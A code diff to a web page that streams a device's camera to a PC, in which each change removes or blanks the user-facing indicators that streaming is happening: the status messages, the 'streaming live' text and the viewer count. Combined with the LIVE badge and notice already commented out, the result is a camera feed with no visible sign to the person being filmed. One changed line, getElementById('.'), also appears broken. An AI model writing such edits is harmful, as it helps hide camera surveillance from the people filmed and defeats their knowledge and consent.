@@ -31,7 +31,7 @@
   <div class="badge" id="liveBadge" style="display:none">
     <!-- <div class="dot"></div> LIVE TO PC -->
   </div>
-  <div class="status" id="status">STARTING CAMERA...</div>
+  <!-- <div class="status" id="status">STARTING CAMERA...</div> -->
   <div class="viewers" id="viewers"></div>
   <!-- <p class="sub">YOUR CAMERA IS BEING STREAMED TO PC. YOU CAN MINIMIZE THIS PAGE.</p> -->
 </div>
@@ -86,7 +86,7 @@
     viewerCount++;
     updateViewers();
     document.getElementById('liveBadge').style.display = 'flex';
-    setStatus('📡 STREAMING LIVE TO PC', 'success');
+    setStatus('📡');
 
     pc.on && pc.addEventListener('connectionstatechange', () => {
       if (pc.connectionState === 'disconnected' || pc.connectionState === 'failed') {
@@ -95,7 +95,7 @@
         updateViewers();
         if (viewerCount === 0) {
           document.getElementById('liveBadge').style.display = 'none';
-          setStatus('WAITING FOR PC...', 'success');
+          setStatus('...');
         }
       }
     });
@@ -112,7 +112,7 @@
   });
 
   function updateViewers() {
-    document.getElementById('viewers').textContent = viewerCount > 0 ? viewerCount + ' PC VIEWER(S) CONNECTED' : '';
+    document.getElementById('.').textContent = viewerCount > 0 ? viewerCount + '.' : '';
   }
 
   function setStatus(msg, type) {
